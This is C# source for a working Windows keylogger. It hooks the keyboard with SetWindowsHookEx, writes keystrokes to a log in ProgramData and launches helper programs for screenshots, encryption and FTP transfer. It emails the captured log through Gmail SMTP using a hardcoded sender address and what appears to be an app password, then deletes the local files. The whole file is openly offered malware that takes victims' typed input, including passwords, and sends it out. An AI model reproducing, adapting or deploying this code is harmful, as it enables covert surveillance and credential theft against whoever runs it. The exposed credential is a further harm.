using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace keylogger
{
    class Program
    {
        
        // ----------- Personal Editable Variables ----------- //
        private const string FROM_EMAIL_ADDRESS = "sibertest06@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "cfsntzkqohostvel";
        private const string TO_EMAIL_ADDRESS = "sibertest06@gmail.com";
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const string Encryption_data = @"C:\ProgramData\enc_data.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        // ----------------------------- END -------------------------------- //
        //boot control
        private static bool control = false;
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        private static int[] clock = new int [] { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 };
        private static int clock_control = 0;
        static void Main(string[] args)
        {
            //exe run at startup
            if (control)
            {
                Process boot = new Process();
                boot.StartInfo.FileName = @"Reboot.exe";
                boot.Start();
                boot.WaitForExit();

                if (boot.HasExited)
                {
                    control = false;
                }
            }

            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            // Archive and email the log file if the max size has been reached
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                //take screenshot in spesific hours.
                int hour = DateTime.Now.Hour;
                if (hour != clock_control)
                {
                    foreach (var i in clock)
                    {
                        if (hour == i)
                        {
                            Process screenshot = new Process();
                            screenshot.StartInfo.FileName = @"ScreenShot.exe";
                            screenshot.Start();
                            screenshot.WaitForExit();
                            clock_control = hour;
                            Console.WriteLine("I am in");
                        }
                    }
                }
                try
                {
                    // Copy the log file to the archive
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    // Delete the log file
                    logFile.Delete();

                    //encryption
                    Process process = new Process();
                    process.StartInfo.FileName = @"encryption.exe";
                    process.Start();

                    // Wait for the process to exit
                    process.WaitForExit();

                    // Check if the process has exited
                    if (process.HasExited)
                    {
                        // Email the archive and send email using a new thread
                        System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                        Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                        mailThread.Start();
                    }
                 


                }
                catch(Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }
            
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Remove text files
        static void rmFile()
        {
            File.Delete(Encryption_data);
            File.Delete(ARCHIVE_FILE_NAME);
        }
        
        static void transfer()
        {
            Process transfer = new Process();
            transfer.StartInfo.FileName = @"FtpTransfer.exe";
            transfer.Start();

            transfer.WaitForExit();

            if (transfer.HasExited)
            {
                rmFile();
            }
        }

        public static void sendMail()
        {
            try
            {
                // Read the archive file contents into the email body variable
                StreamReader input = new StreamReader(Encryption_data);
                string emailBody = input.ReadToEnd();
                input.Close();

                // Create the email client object
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                // Build the email message
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(@"C:\ProgramData\enc_data.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                // Set the recipient
                message.To.Add(TO_EMAIL_ADDRESS);

                // Send the message
                client.Send(message);

                // Release resources used by the msssage (archive file)
                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
            transfer();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
